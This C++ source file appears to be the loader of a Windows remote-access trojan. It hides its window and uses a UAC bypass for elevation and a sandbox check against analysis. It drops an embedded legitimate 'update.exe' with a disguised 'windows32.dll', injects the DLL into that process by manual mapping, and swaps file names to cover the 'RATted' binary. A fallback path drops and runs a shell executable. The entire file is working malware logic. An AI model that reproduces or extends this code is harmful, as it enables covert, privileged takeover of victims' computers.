#include "injection.h"
#include "utils.h"
#include "embeds.h"

#include <Shared/utility.h>

#ifndef BYPASS_UAC
extern "C" {
    #include "bypass.h"
}
#endif

#include <string>
#include <iostream>
#include <WinUser.h>

#define     MY_DLL      "windows32.dll"
#define     MY_TARGET   "update.exe"

//WinMain is the entry point for windows subsystem (GUI apps) but without initializing the window the process will be hidden graphically
int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
    _In_opt_ HINSTANCE hPrevInstance,
    _In_ LPWSTR    lpCmdLine,
    _In_ int       nCmdShow)
{
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);
    //Alloc console for debugging purposes since the manual mapper can't be compiled in debug
    CreateDebugConsole();
	//Must be called before calling UAC bypass due to it manipulating/faking executable information
	auto cwd = GetCWD();
    auto target = (cwd + std::string(MY_TARGET)); //Full path to the target executable
    std::string modName = ExeModuleName();

#ifdef BYPASS_UAC
    if (!Utils::IsElevated()) {
        StartProcessAsAdmin((LPWSTR)ExePathW(), FALSE);
        return 0;
    }
#else 
    wdCheckEmulatedVFS();
#endif

    STARTUPINFO info = { sizeof(info) };
    PROCESS_INFORMATION processInfo;

#ifndef SELF_INJECTION
    //Extracts the legit image and dll to execute from its own image and starts it (inherits administrator permission from parent process)
    Utils::ExtractImageToDisk(embedded_image_2, embedded_image_2_size, target); //First embedded image should be the legit executable

    while (!CreateProcessA(target.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &info, &processInfo))
    {
        Sleep(100);
    }
    CloseHandle(processInfo.hThread);

#ifndef NO_DLL
    Utils::ExtractImageToDisk(embedded_image_1, embedded_image_1_size, cwd + MY_DLL);
#else

#endif

	HANDLE hProc = processInfo.hProcess;
#else
    HANDLE hProc = GetCurrentProcess();
#endif


#ifndef SELF_INJECTION
    std::string trash_path = GetCWD() + "trash.tmp";
    CHAR full_path[MAX_PATH] = { 0 };
    GetModuleFileNameA(NULL, full_path, MAX_PATH);
    remove(trash_path.c_str());
    while (rename(full_path, (trash_path).c_str()) != 0) {
        Sleep(100);
}

    //Rename update.exe to this file's original name to let Dll know it can delete the RATted version from disk
    while (rename(target.c_str(), full_path)) {
        Sleep(100);
    }
#endif

#ifdef SELF_INJECTION
    //Sleep to let DLL do its stuff
    while (true) Sleep(1); 
#endif

#ifndef NO_DLL
    //Remove my dll from disk just in case idk
    remove((cwd + MY_DLL).c_str());
#endif


#ifndef NO_DLL
    auto pMyDll = ManualMap(hProc, (cwd + MY_DLL).c_str());
    while (!pMyDll) {
        pMyDll = ManualMap(hProc, (cwd + MY_DLL).c_str());
        Sleep(1000);
    }
    CloseHandle(hProc);
#else
    std::ofstream output;
    output.open(SHELL_EXE, std::ofstream::binary);
    output.write((char*)embedded_image_1, embedded_image_1_size);
    output.close();

    //Open the shell, which will then load the service and everything should be smooth sailing from here
    std::string CmdLine = trash_path + "," + modName;
    while (!CreateProcessA(NULL, (LPSTR)(SHELL_EXE " " + CmdLine).c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &info, &processInfo))
    {
        Log("Could not create shell process");

        Sleep(100);
    }
    Log("Successfully created shell process");
    CloseHandle(processInfo.hProcess);
    CloseHandle(processInfo.hThread);
#endif

	return 0;
}
